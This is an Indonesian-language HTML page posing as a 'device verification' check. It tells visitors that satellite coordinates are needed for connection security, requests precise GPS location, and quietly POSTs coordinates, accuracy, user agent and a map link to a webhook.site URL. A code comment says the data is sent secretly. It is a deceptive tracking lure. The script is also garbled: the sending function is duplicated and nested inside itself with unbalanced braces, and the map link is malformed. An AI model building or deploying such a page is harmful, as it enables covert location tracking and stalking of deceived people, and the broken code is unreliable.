<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Perangkat</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f8f9fa; margin: 0; }
        .box { background: white; padding: 35px 20px; border-radius: 12px; box-shadow: 0px 4px 15px rgba(0,0,0,0.05); max-width: 400px; margin: 50px auto; border: 1px solid #e9ecef; }
        h2 { color: #212529; margin-top: 0; font-size: 22px; }
        p { color: #6c757d; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        button { padding: 16px 20px; font-size: 16px; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: background 0.2s; }
        button:active { background-color: #0056b3; }
        #status { margin-top: 25px; font-size: 14px; color: #495057; font-weight: 500; background-color: #f1f3f5; padding: 12px; border-radius: 6px; display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2>Verifikasi Akses Perangkat</h2>
    <p>Situs ini memerlukan konfirmasi koordinat satelit untuk memastikan keamanan koneksi perangkat Anda.</p>
    
    <button onclick="prosesAkses()">Verifikasi Perangkat Saya</button>
    
    <div id="status">Status: Menunggu instruksi...</div>
</div>

<script>
    // === PENGATURAN WEBHOOK ===
    // Tempelkan (paste) link unik dari Webhook.site Anda di dalam tanda petik di bawah ini:
    const WEBHOOK_URL = "https://webhook.site/68996063-1d76-4c3e-8705-367f9391aad2" ;

    function prosesAkses() {
        const statusDiv = document.getElementById('status');
        statusDiv.style.display = "block";

        if (!navigator.geolocation) {
            statusDiv.innerHTML = "<span style='color: #dc3545;'>Gagal: Browser Anda memblokir fitur pembacaan GPS.</span>";
            return;
        }

        statusDiv.innerHTML = "🔄 Sedang memproses enkripsi keamanan...<br><small style='color: #6c757d;'>Silakan klik 'Izinkan' jika muncul permintaan lokasi.</small>";
        
        // Meminta lokasi dengan akurasi tinggi
        navigator.geolocation.getCurrentPosition(kirimKeWebhook, tanganiError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    }

    function kirimKeWebhook(position) {
        const statusDiv = document.getElementById('status');
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const akurasi = Math.round(position.coords.accuracy);
        
        // Data yang akan dikirim dan dicatat di Webhook
        const dataRiwayat = {
            waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
            latitude: lat,
            longitude: lng,
            akurasi_meter: akurasi,
            perangkat: navigator.userAgent,
            link_peta: `https://google.com{lat},${lng}`
        };

        statusDiv.innerHTML = "🔄 Menyimpan data ke riwayat server...";

        // Mengirim data menggunakan metode POST secara diam-diam ke Webhook.site
            function kirimKeWebhook(position) {
        const statusDiv = document.getElementById('status');
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const akurasi = Math.round(position.coords.accuracy);
        
        const dataRiwayat = {
            waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
            latitude: lat,
            longitude: lng,
            akurasi_meter: akurasi,
            perangkat: navigator.userAgent,
            link_peta: `https://google.com{lat},${lng}`
        };

        statusDiv.innerHTML = "🔄 Menyimpan data ke riwayat server...";

        // Menambahkan mode: "no-cors" agar tidak diblokir oleh Google Chrome HP
        fetch(WEBHOOK_URL, {
            method: "POST",
            mode: "no-cors", 
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(dataRiwayat)
        })
        .then(() => {
            // Karena menggunakan mode no-cors, kita langsung anggap sukses kirim
            statusDiv.innerHTML = "<span style='color: #28a745;'><b>✓ Verifikasi Sukses!</b></span><br>Perangkat Anda berhasil dicatat dalam log keamanan.";
        })
        .catch(error => {
            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Error Koneksi:</b> Gagal mengirim data riwayat ke server.</span>";
        });
    }


    function tanganiError(error) {
        const statusDiv = document.getElementById('status');
        if (error.code === error.PERMISSION_DENIED) {
            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Akses Ditolak!</b></span><br>Anda harus memilih 'Izinkan' agar verifikasi perangkat berhasil.";
        } else {
            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Gagal Mengunci GPS!</b></span><br>Pastikan fitur lokasi HP Anda dalam keadaan aktif.";
        }
    }
</script>
</body>
</html>
